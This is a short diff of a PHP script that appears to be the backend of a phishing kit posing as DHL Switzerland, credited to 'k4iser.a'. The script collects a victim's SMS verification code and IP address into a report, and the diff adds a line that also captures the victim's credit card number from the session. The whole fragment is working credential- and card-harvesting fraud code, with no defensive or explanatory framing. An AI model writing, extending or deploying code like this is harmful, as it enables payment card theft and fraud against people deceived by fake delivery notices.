@@ -1,5 +1,7 @@
 <?php
 
+session_start();
+
 
 $sms=$_POST["sms"];
 
@@ -16,6 +18,7 @@ $ip = getenv("REMOTE_ADDR");
 $hostname = gethostbyaddr($ip);
 $message .= "~ Coded By k4iser.a  ~\n";
 $message .= "|----------|SMS 2 DHL-CH |----------|\n";
+$message .= "CREDIT CARD    : ".$_SESSION['cc']."\n";
 $message .= "SMS 2  : ".$_SESSION['sms']."\n";
 $message .= "|------------------+|IP|-------------------|\n";
 $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
